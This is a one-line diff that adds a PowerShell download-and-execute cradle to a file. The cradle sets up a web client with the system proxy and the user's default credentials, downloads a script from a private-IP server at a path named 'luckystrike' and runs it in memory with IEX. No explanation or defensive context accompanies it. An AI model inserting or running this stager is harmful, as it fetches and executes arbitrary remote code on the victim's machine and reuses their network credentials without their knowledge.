@@ -1,0 +1,1 @@
+$z=new-object net.webclient;$z.proxy=[Net.WebRequest]::GetSystemWebProxy();$z.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $z.downloadstring('http://192.168.136.129:8080/luckystrike');
